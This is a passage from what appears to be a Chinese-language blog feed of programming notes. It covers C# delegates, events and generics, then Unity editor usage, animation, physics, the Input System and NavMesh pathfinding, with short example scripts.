class="built_in">string</span>&gt; sayHelloTo = (name) =&gt; Console.WriteLine(<span class="string">&quot;Hello, &quot;</span> + name + <span class="string">&quot;!&quot;</span>);</span><br><span class="line">sayHelloTo(<span class="string">&quot;John&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.使用Func定义一个带有参数和返回值的方法，最后一个泛型是返回值</span></span><br><span class="line">Func&lt;<span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>&gt; <span class="keyword">add</span> = (a, b) =&gt; a + b;</span><br><span class="line"><span class="built_in">int</span> result = <span class="keyword">add</span>(<span class="number">3</span>, <span class="number">5</span>);</span><br><span class="line">Console.WriteLine(result); <span class="comment">// 输出：8</span></span><br></pre></td></tr></table></figure><h3 id="7-事件"><a href="#7-事件" class="headerlink" title="7 事件"></a>7 事件</h3><blockquote><p><strong>发布器（publisher）</strong> 是一个包含事件和委托定义的对象。事件和委托之间的联系也定义在这个对象中。发布器（publisher）类的对象调用这个事件，并通知其他的对象。</p><p><strong>订阅器（subscriber）</strong> 是一个接受事件并提供事件处理程序的对象。在发布器（publisher）类中的委托调用订阅器（subscriber）类中的方法（事件处理程序）。</p></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 简单的监听事件</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Demo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">int</span> myValue;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> MyValue</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">get</span> &#123; <span class="keyword">return</span> myValue; &#125;</span><br><span class="line">        <span class="keyword">set</span></span><br><span class="line">        &#123;</span><br><span class="line">            myValue = <span class="keyword">value</span>;</span><br><span class="line">            <span class="comment">// 非空则触发事件</span></span><br><span class="line">            MyValueChanged?.Invoke();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 新建事件</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">event</span> Action MyValueChanged;</span><br><span class="line"><span class="comment">// 事件被触发的函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">OnMyValueChanged</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Changed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        Demo demo = <span class="keyword">new</span> Demo();</span><br><span class="line">        <span class="comment">// 绑定时间的触发函数</span></span><br><span class="line">        demo.MyValueChanged += demo.OnMyValueChanged;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用MyValue的set方法，触发事件</span></span><br><span class="line">        demo.MyValue = <span class="number">10</span>;</span><br><span class="line">        demo.MyValue = <span class="number">10</span>;</span><br><span class="line">        demo.MyValue = <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 预定义的委托事件</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">MyClass</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">event</span> EventHandler MyEvent;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">OnMyEvent</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        MyEvent?.Invoke(<span class="keyword">this</span>, EventArgs.Empty);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        MyClass myObject = <span class="keyword">new</span> MyClass();</span><br><span class="line">        myObject.MyEvent += MyEventHandler;</span><br><span class="line"></span><br><span class="line">        myObject.OnMyEvent();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// sender：表示触发事件的对象，通常是引发事件的对象实例。</span></span><br><span class="line">    <span class="comment">// e：是一个包含事件数据的类，它派生自System.EventArgs类。它可以携带与事件相关的信息，例如事件的名称、时间戳或其他自定义数据。</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">MyEventHandler</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Event handled!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-泛型"><a href="#8-泛型" class="headerlink" title="8 泛型"></a>8 泛型</h3><blockquote><p>泛用类型，T可以是不同的数据类型。</p></blockquote><div class="table-container"><table><thead><tr><th>约束类型</th><th>作用</th></tr></thead><tbody><tr><td>where T: struct</td><td>T必须是一个值类型</td></tr><tr><td>where T : class</td><td>T必须是一个引用类型</td></tr><tr><td>where T : new()</td><td>T必须有一个无参数的公共构造函数</td></tr><tr><td>where T : &lt;base class name&gt;</td><td>T必须是指定的基类或派生自指定的基类</td></tr><tr><td>where T : &lt;interface name&gt;</td><td>T必须实现指定的接口</td></tr><tr><td>where T : U</td><td>T必须是U或派生自U</td></tr><tr><td>where T : notnull</td><td>T不能为null</td></tr><tr><td>where T : unmanaged</td><td>T必须是非托管类型</td></tr></tbody></table></div><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 函数参数泛型</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Swap</span>&lt;<span class="title">T</span>&gt;(<span class="params"><span class="keyword">ref</span> T lhs, <span class="keyword">ref</span> T rhs</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    T temp;</span><br><span class="line">    temp = lhs;</span><br><span class="line">    lhs = rhs;</span><br><span class="line">    rhs = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 双泛型类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">GenericClass</span>&lt;<span class="title">T1</span>, <span class="title">T2</span>&gt;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> T1 genericMember1;</span><br><span class="line">    <span class="keyword">private</span> T2 genericMember2;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">GenericClass</span>(<span class="params">T1 value1, T2 value2</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        genericMember1 = value1;</span><br><span class="line">        genericMember2 = value2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 泛型委托</span></span><br><span class="line"><span class="function"><span class="built_in">delegate</span> T <span class="title">NumberChanger</span>&lt;<span class="title">T</span>&gt;(<span class="params">T n</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在委托后面可以接where T: ...来约束类型</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Request</span>&lt;<span class="title">T</span>&gt;() <span class="keyword">where</span> T : <span class="keyword">class</span></span></span><br></pre></td></tr></table></figure><h3 id="9-匿名方法"><a href="#9-匿名方法" class="headerlink" title="9 匿名方法"></a>9 匿名方法</h3><h3 id="10-多线程"><a href="#10-多线程" class="headerlink" title="10 多线程"></a>10 多线程</h3>]]></content>
      
      
      <categories>
          
          <category> 游戏程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 游戏引擎 </tag>
            
            <tag> C# </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unity使用</title>
      <link href="/posts/4d74a038.html"/>
      <url>/posts/4d74a038.html</url>
      
        <content type="html"><![CDATA[<h1 id="Unity使用"><a href="#Unity使用" class="headerlink" title="Unity使用"></a>Unity使用</h1><hr><h2 id="〇、项目管理"><a href="#〇、项目管理" class="headerlink" title="〇、项目管理"></a>〇、项目管理</h2><h3 id="1-项目操作"><a href="#1-项目操作" class="headerlink" title="1 项目操作"></a>1 项目操作</h3><blockquote><p>打开项目：直接在Unity Hub中选择带有资源的主文件夹即可。</p></blockquote><hr><h2 id="一、快捷键"><a href="#一、快捷键" class="headerlink" title="一、快捷键"></a>一、快捷键</h2><h3 id="1-移动"><a href="#1-移动" class="headerlink" title="1 移动"></a>1 移动</h3><blockquote><p>按住鼠标右键 + wsad移动 + qe上下 </p><p>qwerty    对物体进行不同的操作</p></blockquote><h3 id="2-定位"><a href="#2-定位" class="headerlink" title="2 定位"></a>2 定位</h3><blockquote><p>物体控制：</p><ul><li>F：中心定位</li><li>V：顶点吸附</li></ul><p>自身移动：</p><ul><li>ctrl + shift + F    当前物体到视野处</li><li>alt + 鼠标左键   围绕物体旋转</li><li>alt + 鼠标右键   围绕物体放大缩小</li></ul><p>项目控制：</p><ul><li>ctrl + z  撤回</li><li>ctrl + y  前进</li><li>ctrl + d  复制</li></ul></blockquote><h2 id="二、界面"><a href="#二、界面" class="headerlink" title="二、界面"></a>二、界面</h2><h3 id="1-界面显示"><a href="#1-界面显示" class="headerlink" title="1 界面显示"></a>1 界面显示</h3><blockquote><p>scene右上角，切换 3D 和 2D。</p></blockquote><h3 id="2-场景"><a href="#2-场景" class="headerlink" title="2 场景"></a>2 场景</h3><blockquote><p>一个scene相当于一关，制作完成scene后应当保存scene。</p></blockquote><h3 id="3-检视器"><a href="#3-检视器" class="headerlink" title="3 检视器"></a>3 检视器</h3><blockquote><p>右边检视器会显示物体所带的组件。</p></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 自定义检视器中显示的组件</span></span><br><span class="line"><span class="comment">// 公开属性会显示，加上[HideInInspector]则会隐藏</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">int</span> HP;</span><br><span class="line"><span class="comment">// 序列化的私有属性也会显示</span></span><br><span class="line">[<span class="meta">SerializeField</span>] <span class="keyword">private</span> <span class="built_in">int</span> HP;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 标题，后续的设置的可显示变量会跟在该标题后</span></span><br><span class="line">[<span class="meta">Header(<span class="string">&quot;Name&quot;</span>)</span>]</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">// 属性中有子属性</span></span><br><span class="line">[<span class="meta">System.Serializable</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">struct</span> Attributes</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> HP;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> MP;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Attribute attribute;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 空格</span></span><br><span class="line">[<span class="meta">Space</span>]</span><br></pre></td></tr></table></figure><hr><h2 id="三、材质"><a href="#三、材质" class="headerlink" title="三、材质"></a>三、材质</h2><blockquote><p>物体样式都是通过新建材质，然后改材质参数来进行修改的</p></blockquote><h3 id="1-单个物体"><a href="#1-单个物体" class="headerlink" title="1 单个物体"></a>1 单个物体</h3><blockquote><p>基本属性：</p><ul><li>position：当前位置坐标。（单位：米） </li><li>rotation：当前旋转角度 。</li><li>scale：缩放比例。</li></ul><p>scene面板：</p><ul><li>center - pivot：改变轴心点。</li><li>gobal - local：改变坐标朝向。</li></ul></blockquote><h3 id="2-组件"><a href="#2-组件" class="headerlink" title="2 组件"></a>2 组件</h3><blockquote><p>Transform变换组件（如上基本属性）</p><p>Mesh Filter网格过滤器：形状</p><p>Mesh Renderer网格渲染器：材质</p></blockquote><h3 id="3-打组"><a href="#3-打组" class="headerlink" title="3 打组"></a>3 打组</h3><blockquote><p>父子对象：</p><ul><li>父对象坐标相对于全局。</li><li>子对象坐标相对于父物体。</li></ul></blockquote><hr><h2 id="四、camera"><a href="#四、camera" class="headerlink" title="四、camera"></a>四、camera</h2><blockquote><p>场景中只会存在一个主摄像头，Tag是MainCamera。</p><p>Clear Flags：</p><ol><li>Skybox：<ul><li>使用天空盒作为背景，并且会清除摄像机中的所有物体和UI。</li><li>适用于使用天空盒来创建场景背景的情况。</li></ul></li><li>Solid Color：<ul><li>使用指定的颜色作为背景，并且会清除摄像机中的所有物体和UI。</li><li>可以自定义背景颜色，适用于需要单一背景色的情况。</li></ul></li><li>Depth Only：<ul><li>只清除深度缓冲区，保留原先的颜色缓冲区。</li><li>适用于只需要进行深度测试、但不想清除颜色缓冲区的情况。</li></ul></li><li>Don’t Clear：<ul><li>不清除任何缓冲区，保留原先的内容。</li><li>适用于需要将多个相机渲染结果叠加在一起的情况，例如创建镜头特写效果或实现多层次的渲染。</li></ul></li><li>Don’t Clear（with Skybox）：<ul><li>在不清除缓冲区的同时，仍然使用天空盒作为背景。</li><li>适用于保留天空盒背景而不清除其他缓冲区的情况。</li></ul></li></ol><p>Culling Mask：</p><ul><li>摄像机绘制的元素。</li><li>影响对象是物体Layer。</li></ul><p>Projection：</p><ul><li><p>perspective：3D投影方式</p></li><li><p>orthographic：2D投影方式。</p></li></ul><p>Depth：深度值，在场景中深度值大的相机会覆盖住深度值小的相机的界面。</p></blockquote><hr><h2 id="五、渲染"><a href="#五、渲染" class="headerlink" title="五、渲染"></a>五、渲染</h2><hr><h2 id="六、光"><a href="#六、光" class="headerlink" title="六、光"></a>六、光</h2><hr><h2 id="七、动画"><a href="#七、动画" class="headerlink" title="七、动画"></a>七、动画</h2><h3 id="1-Animation"><a href="#1-Animation" class="headerlink" title="1 Animation"></a>1 Animation</h3><p>显示动画视图：Window——Animation——Animation</p><blockquote><p>录制：</p><ol><li><p>Animation——Animation。（ctrl + 6）</p></li><li><p>给指定组件：add Component——Animation。</p></li><li>Animation中点击create。</li><li>add property，对组件操作。</li><li>面板左上红色按钮开始录制，调轴，设置动画效果。</li></ol><p>使用：</p><ol><li>Animation中补充动画，一运行就会播放。</li><li>Animations中补充动画，选择自动播放。</li></ol></blockquote><p>Animation——Animation使用</p><blockquote><p>时间轴：1:00 表示第1秒第00帧。</p><p>轴上的点：一个动画操作。add property可以添加对指定一个物体的一个动画操作。</p><p>轴上左键双击（或右键——Add Key）：添加轴上点。设置上一点到这一点的帧数，可以设置起始位置和结束位置属性，中间的帧数会自动补齐。</p><p>下面Dopesheet：点，Curves：线。</p><p>左边的长方形带加号：事件。在某一帧绑定函数。</p></blockquote><h3 id="2-动画状态"><a href="#2-动画状态" class="headerlink" title="2 动画状态"></a>2 动画状态</h3><blockquote><p>Default：默认，一次</p><p>Once：一次</p><p>Loop：循环</p><p>Clamp Forever：播放一次后固定到最后一帧不可再操作</p><p>Ping Pong：自动来回</p></blockquote><h3 id="3-Animator"><a href="#3-Animator" class="headerlink" title="3 Animator"></a>3 Animator</h3><p>显示动画视图：Window——Animation——Animator</p><blockquote><p>Entry：程序开始。</p><p>Exit：程序结束。</p><p>Any State：任何状态。</p><p>默认动画：右键——Set as Layer Default State</p></blockquote><p>动画连接：进入动画视图后——右键——Make Transition——指定下一个动画</p><blockquote><p>点击箭头可以设置动画连接条件。</p><p>Has Exit Time：自然衔接下一动画。</p><p>Exit Time：n 个当前动画后进入下一动画</p><p>Fixed Duration：固定值还是百分比</p><p>Transition Duration：动画过渡时间</p><p>Can Transition To Self [Any State的连线的属性]：可以过渡到自己（多图动画要取消，否则会无限播放第一帧）</p></blockquote><p>Blend Tree：Animator——右键——Create State——From New Blend Tree</p><blockquote><p>Blend Type：混合树类型</p><ul><li>1D：由一个参数控制</li></ul><p>Parameter：参数。该参数下的图为动画权重图。</p><p>动画：</p><ul><li>Motion：动画，点击加减可以增减动画</li><li>Threshold：阈值。当参数值为该值时权重为1。</li><li>时间图标：动画播放速度。</li><li>人图标：镜像动画。一般仅限有Avatar的人形动画使用。</li></ul><p>Automate Threshold：自动设置阈值。</p></blockquote><p>方法</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 对parameters中的值进行赋值</span></span><br><span class="line">animator.SetFloat(parameter, Mathf.Abs(leftRight));</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Conditions中设置run要Greater0.1来切换闲置到运动动画，设置run要less0.1来切换运动到闲置动画</span></span><br><span class="line">animator.SetFloat(<span class="string">&quot;Run&quot;</span>, Mathf.Abs(leftRight));</span><br></pre></td></tr></table></figure><hr><h2 id="八、物理引擎"><a href="#八、物理引擎" class="headerlink" title="八、物理引擎"></a>八、物理引擎</h2><h3 id="1-刚体"><a href="#1-刚体" class="headerlink" title="1 刚体"></a>1 刚体</h3><blockquote><p>Add Component——Rigidbody</p><p>Body Type：</p><ol><li>Dynamic（动态）：<ul><li>刚体将受到物理力和碰撞的影响，可以移动、旋转，并与其他刚体产生相互作用。</li><li>可以通过代码或物理引擎施加力或扭矩来改变其运动和旋转状态。</li></ul></li><li>Kinematic（运动学）：<ul><li>刚体不受物理力的影响，不会被弹性碰撞框架推动或旋转。</li><li>可以通过代码控制刚体的运动和旋转状态。</li><li>当与静态刚体或非运动学刚体发生碰撞时，运动学刚体可能会传递或接收碰撞信息，但不会有物理反应。</li></ul></li><li>Static（静态）：<ul><li>刚体不受物理力和碰撞的影响，固定在空间中的位置，不可移动或旋转。</li><li>静态刚体用于创建环境中的静态障碍物或地面等，提供运动学刚体与之互动的碰撞体。</li></ul></li></ol><p>Dynamic：</p><ul><li>Mass：质量（无单位，统一即可）。</li><li>Drag：阻力。（通常，砖头：0.001，羽毛：10）</li><li>Angular Drag：角阻力。</li><li>Use Gravity：是否有重力。</li><li>Is Kinematic：是否运动学。勾选后约等于霸体。</li></ul><p>Interpolate：缓解刚体运行时的抖动。</p><ul><li><p>None：无插值。</p></li><li><p>Interpolate：内插值，基于上一帧的变化来平滑本帧变换。</p></li><li><p>Extrapolate：外插值，基于下一帧的预估来平滑本帧变换。</p></li></ul><p>Collision Detection：碰撞检测。</p><ul><li><p>Discrete：不连续碰撞检测，用于普通物体。</p></li><li><p>Continuous：连续碰撞检测。</p></li><li><p>Continuous Dynamic：连续动态碰撞检测，适用于高速物体。</p></li></ul><p>Constraits：冻结某个方向的作用或旋转。</p><p>带刚体的物体在运动时物理引擎会检测刚体状态。所以带刚体无重力和不带刚体的物体表面一致，但在运动判断时有区别。</p></blockquote><h3 id="2-碰撞体"><a href="#2-碰撞体" class="headerlink" title="2 碰撞体"></a>2 碰撞体</h3><blockquote><p>Add Component—— *** Collider（一般选Box Collider，节约性能）</p><p>然后可以在Edit Collider中调节碰撞体大小和位置。</p><p>Mesh Collider：精确，但十分消耗性能。使用应勾上Convex来减少网格增加性能。</p></blockquote><h3 id="3-物理材质"><a href="#3-物理材质" class="headerlink" title="3 物理材质"></a>3 物理材质</h3><blockquote><p>创建：Project——Assets——Create——Physical Material</p><p>挂载：物体的Collider中</p><ul><li>Dynamic Friction：动摩擦力。</li><li>Static Friction：静摩擦力。</li><li>Bounciness：弹力</li><li>Friction Combine：取摩擦力方式。（依两个物体）</li><li>Bounce Combine：取弹力方式。（依两个物体）</li></ul></blockquote><hr><h2 id="九、系统"><a href="#九、系统" class="headerlink" title="九、系统"></a>九、系统</h2><h3 id="1-InputManage"><a href="#1-InputManage" class="headerlink" title="1 InputManage"></a>1 InputManage</h3><p>编辑器</p><blockquote><p>输入管理器，用于让用户自定义按键。</p><p>Edit——Project Setting——Input</p><p>Size：按键个数。</p></blockquote><p>按钮属性</p><blockquote><p>Name：按钮名字。</p><p>Descriptive Name：正向按钮描述信息。</p><p>Descriptive Negative Name：负向按钮描述信息。</p><p>正向按钮和负向按钮都有两个，一个按下返回正数一个返回负数。（按钮不够可以写重名按钮来扩充按钮）</p><p>Negative Button：按下按键返回负数（-1）。</p><p>Positive Button：按下按键返回正数（1）。</p><p>Alt Negative Button：按下按键返回负数（-1）。</p><p>Alt Positive Button：按下按键返回正数（1）。</p><p>初始按钮值为0。按下正向按钮后值会由0依速度变成1，按钮负向按钮后值会由0依速度变成-1。</p><p>Gravity：复位速度，值归到0的速度。</p><p>Sensitivity：灵敏度，0变到值的速度。</p><p>Type：按键类型。键鼠，鼠标移动等。</p><p>Axis：鼠标移动时选定轴。（3rd是鼠标滚轮）</p></blockquote><h3 id="2-Input-System"><a href="#2-Input-System" class="headerlink" title="2 Input System"></a>2 Input System</h3><h4 id="2-1-基本配置"><a href="#2-1-基本配置" class="headerlink" title="2.1 基本配置"></a>2.1 基本配置</h4><blockquote><p>下载：Window——Package Manager——Packages:Unity Registry——Install</p><p>配置：</p><ol><li><p>Edit——Project Setting——Player——Other Settings——Active input Handing*——Both</p></li><li><p>Hierarchy——EventSystem——Replace with InputSystemUIIputModule</p></li></ol><p>新增动作：</p><ol><li>Assets右键——Create——Input Action</li><li>Action Maps：新增一种输入方式。</li><li>Actions：新增对应的动作。</li></ol><p>在Actions中点击加号——Listen——键盘输入，可以监听到输入的键盘的键，然后点击对应的键完成键盘注册。</p><p>左上角Scheme可以新增框架（例如：Mobile，PC等），然后点击到对应的Actions键位的Properties中，在Use in control scheme进行分类。</p></blockquote><h4 id="2-2-案例"><a href="#2-2-案例" class="headerlink" title="2.2 案例"></a>2.2 案例</h4><p>移动</p><blockquote><p>移动Action：</p><ol><li>新加Actions</li><li>点击新加的Actions，Properties——Action Type：Value——Control Type：Vector2</li><li>点击新加的Actions右边的加号——Add Binding——Path——Gamepad——Left Stick</li><li>点击新加的Actions右边的加号——Add Composite——输入wsad</li></ol><p>默认情况下拖拽距离会影响移动速度，修改可以在Actions——Binding Properties——Processors——Normalize Vector2</p><p>脚本挂载：</p><ol><li>玩家——Add component——Player Input——拖入InputSystemUIIputModule</li><li>UI——Add component——On-Screen Stick（移动）——Control Path——Left Stick（Movement Range：摇杆可被拉动最大距离）</li></ol></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 玩家脚本</span></span><br><span class="line"><span class="keyword">using</span> UnityEngine.InputSystem;</span><br><span class="line">InputAction playerMove;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Awake</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    playerMove = GetComponent&lt;PlayerInput&gt;().currentActionMap[<span class="string">&quot;Move&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">FixedUpdate</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">float</span> x = playerMove.ReadValue&lt;Vector2&gt;().x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跳跃</p><blockquote><p>移动Action：</p><ol><li>新加Actions</li><li>点击新加的Actions，Properties——Action Type：Button</li><li>点击新加的Actions右边的加号——Add Binding——Path——Gamepad——Button East</li></ol><p>脚本挂载：</p><ol><li>玩家——Add component——Player Input——拖入InputSystemUIIputModule</li><li>UI——Add component——Control Path——Gamepad——On-Screen Button——Button East</li></ol></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> InputAction playerMove, playerJump;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Awake</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    playerJump = GetComponent&lt;PlayerInput&gt;().currentActionMap[<span class="string">&quot;Jump&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">FixedUpdate</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(playerJump.triggered)&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按钮</p><blockquote><p>点击：ScreenTouch——选择一个Tap</p><p>然后给对象绑定On-Screen Button</p></blockquote><h3 id="3-寻路系统"><a href="#3-寻路系统" class="headerlink" title="3 寻路系统"></a>3 寻路系统</h3><h4 id="3-1-分类"><a href="#3-1-分类" class="headerlink" title="3.1 分类"></a>3.1 分类</h4><blockquote><p>路点寻路（Waypoint Pathfinding）：</p><ul><li>特点：路点寻路是将地图或场景分为离散的路点，并在这些路点之间进行寻路。通常，每个路点与附近的路点相连，形成一个图。通过搜索算法（如A*算法）在路点之间进行路径搜索。</li><li>应用场景：路点寻路适用于具有预定的可行走区域的环境，如游戏中的角色移动、路径规划等。</li><li>优点：简化了地图的表示和寻路的复杂度，使寻路效率较高。</li></ul><p>单元格寻路（Cell Pathfinding）：</p><ul><li>特点：单元格寻路将地图或场景划分为各个大小相同的正方形单元格，使用图来表示这些单元格之间的连接关系。通过搜索算法寻找单元格之间的路径，可以使用A*、Dijkstra等算法。</li><li>应用场景：单元格寻路适用于需要在细粒度地图或场景中寻找最短路径的情况，如机器人导航、智能交通系统等。</li><li>优点：能够应对复杂的地图结构和障碍物，可以处理更精确的路径规划。</li></ul><p>网格寻路（Grid Pathfinding）：</p><ul><li>特点：网格寻路将地图或场景划分为规则的二维网格，每个网格代表一个固定大小的区域。通常，将可行走区域标记为可通过的网格，将障碍物标记为不可通过的网格。通过搜索算法，在这些网格之间进行路径搜索。</li><li>应用场景：网格寻路适用于在离散化的环境中进行路径规划的情况，如游戏中的NPC移动、机器人避障等。</li><li>优点：简化了地图的表示和搜索算法的实现，适用于对精确路径要求不高的情况。</li></ul></blockquote><h4 id="3-2-使用"><a href="#3-2-使用" class="headerlink" title="3.2 使用"></a>3.2 使用</h4><blockquote><p>寻路组件（网格寻路）：Component——Navigation</p><ul><li><p>Nav Mesh Agent：寻路者。</p></li><li><p>Off Mesh Link：无材质路点连接。</p></li><li><p>Nav Mesh Obstacle：寻路网格障碍物，用于动态碰撞。</p></li></ul><p>使用步骤：</p><ol><li>Component——Navigation——Nav Mesh Agent：设置寻路者。</li><li>Window——AI——Navigation——Object：选择Navigation Static和Generate OffMeshLinks。</li><li>Window——AI——Navigation——Bake——Bake：进行路面烘焙。（路面物体设为Static）</li></ol></blockquote><h4 id="3-3-Nav-Mesh-Agent"><a href="#3-3-Nav-Mesh-Agent" class="headerlink" title="3.3 Nav Mesh Agent"></a>3.3 Nav Mesh Agent</h4><blockquote><p>Base Offset：寻路间隔上下偏移。</p><p>Steering：</p><ul><li>Speed：移动速度。</li><li>Angular Speed：转弯角速度。</li><li>Acceleration：转弯加速度。</li><li>Stopping Distance：停止时离目标的距离。</li><li>Auto Braking：自动停止。</li></ul><p>Obstacle Avoidance：</p><ul><li>Radius：寻路间隔半径。</li><li>Height：寻路间隔高。</li><li>Quality：躲避等级。较高的质量级别将导致更准确的障碍物避免计算，但可能会增加计算开销和性能损耗。</li><li>Priority：优先级参数用于定义障碍物避免的重要性。值0-100。较高的优先级值表示对象更重视避免障碍物。</li></ul><p>Path Finding：</p><ul><li>Auto Traverse Off Mesh</li><li>Auto Repath</li><li>Area Mesh：寻路遮罩，选择可走区域。</li></ul></blockquote><h4 id="3-4-Off-Mesh-Link"><a href="#3-4-Off-Mesh-Link" class="headerlink" title="3.4 Off Mesh Link"></a>3.4 Off Mesh Link</h4><blockquote><p>Start / End：开始和结束点。</p><p>Cost Override：路径移动消耗。默认-1。设置为整数表示是默认消耗的几倍。</p><p>Bidirectional：是否双向。</p><p>Activated：路径是否激活。</p><p>Auto Update Positions：自动更新路径。</p><p>Navigation Area</p></blockquote><h4 id="3-5-Nav-Mesh-Obstacle"><a href="#3-5-Nav-Mesh-Obstacle" class="headerlink" title="3.5 Nav Mesh Obstacle"></a>3.5 Nav Mesh Obstacle</h4><blockquote><p>Shape：碰撞形状。</p><p>Center，Size：位置和大小。</p><p>Carve：开启后，会影响agent路径的计算。不开启则不会。</p><ul><li>Move Threshold：移动多少米后重新计算网格。</li><li>Time To Stationary：静止多少秒后重新计算网格。</li><li>Carve Only Stationary：仅静止时才有网格。</li></ul></blockquote><h4 id="3-6-Navigation"><a href="#3-6-Navigation" class="headerlink" title="3.6 Navigation"></a>3.6 Navigation</h4><blockquote><p>Bake：</p><ul><li>Agent Radius：和静态障碍物的半径距离。</li></ul><p>Agent Height：寻路网格和路面距离：</p><ul><li>Max Slope：最大坡度。</li></ul><p>Step Height：台阶高度：</p><ul><li>Generated Off Mesh Links：自动搭桥</li><li>Drop Height<ul><li>Jump Distance：地面距离小于n自动搭桥</li></ul></li></ul><p>Areas：</p><ul><li>区域名称和花费。消耗值越小会被优先考虑。</li></ul><p>Object：</p><ul><li>Navigation Area：选择区域。</li></ul></blockquote><h4 id="3-7-注意"><a href="#3-7-注意" class="headerlink" title="3.7 注意"></a>3.7 注意</h4><blockquote><ol><li>设置好了寻路网格后，路面可以取消材质甚至设置为非激活状态。agent一样可以寻路。但是加了重力后就会脱离路面。</li><li>改变场景后要重新烘焙，烘焙路面不会随场景改变而自动改变。</li></ol></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 寻路者脚本</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Navigation</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span 